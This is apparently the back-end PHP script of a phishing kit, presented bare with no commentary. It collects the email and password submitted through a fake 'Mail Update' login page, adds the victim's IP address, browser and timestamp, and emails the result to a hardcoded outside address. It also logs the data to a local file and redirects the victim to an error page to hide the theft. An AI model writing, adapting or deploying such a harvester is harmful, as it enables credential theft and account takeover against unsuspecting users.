<?

 /*
 
  */
  
$email=$_GET['email'];
$ip = getenv("REMOTE_ADDR");
$adddate=date("D M d, Y g:i a");
$browser = $_SERVER['HTTP_USER_AGENT'];
$browser  =     $_SERVER['HTTP_USER_AGENT'];
$message  =     "=============+[ User Info ]+==============\n";
$message .=     "Email : ".$_POST['email']."\n";
$message .=     "Password : ".$_POST['password']."\n";
$message .=     "=============+[ Location Info ]+===============\n";
$message .=     "IP: ".$ip."\n";
$message .=     "=======================================\n";
$message .= 	"User-Agent: ".$browser."\n";
$message .=     "=======================================\n";
$message .=     "Date  & Time Log  : ".$adddate."\n";
$message .=     "=======================================\n";
$danez = 'Mail Update';
$who_be_the_boss = 'MU';
$subj = "$danez Login $ip $adddate\n";
$from = "From: $who_be_the_boss <west>\n";
mail("ervinodane@yahoo.com",$subj,$message,$from,$danez);

{
mail($mesaegs,$subject,$message,$headers);
mail($mail,$subject,$message,$headers);
$fp = fopen('logs.txt', 'a');
fwrite($fp, $message);
fclose($fp);
}

header("Location: error.php?rand=WebAppSecurity.1&email=$email");

?>